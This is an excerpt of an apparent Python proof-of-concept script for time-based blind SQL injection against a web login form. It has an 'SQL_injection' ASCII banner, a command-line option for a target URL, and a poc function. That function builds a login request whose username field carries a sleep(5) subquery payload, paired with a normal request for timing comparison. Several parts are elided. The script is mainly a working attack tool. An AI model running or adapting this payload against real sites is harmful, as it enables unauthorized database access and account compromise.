...
def banner():
    test = """
  __    ____  __     _        _           _   _             
/ _\  /___ \/ /    (_)_ __  (_) ___  ___| |_(_) ___  _ __  
\ \  //  / / /     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
_\ \/ \_/ / /___   | | | | || |  __/ (__| |_| | (_) | | | |
\__/\___,_\____/___|_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
              |_____|     |__/                             """
    print(test)
...
def main():
    ...
    # 添加参数
    # -u 接收单个URL链接
    parser.add_argument("-t", "--url", dest="t", type=str, help="URL目标")
...
def poc(target, output_file):
    ...
    data_sleep = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
    data_normal = "username=1115222222%40qq.com&password=70fb2ad61805e4308b2e85d8b153d9e9&captcha="
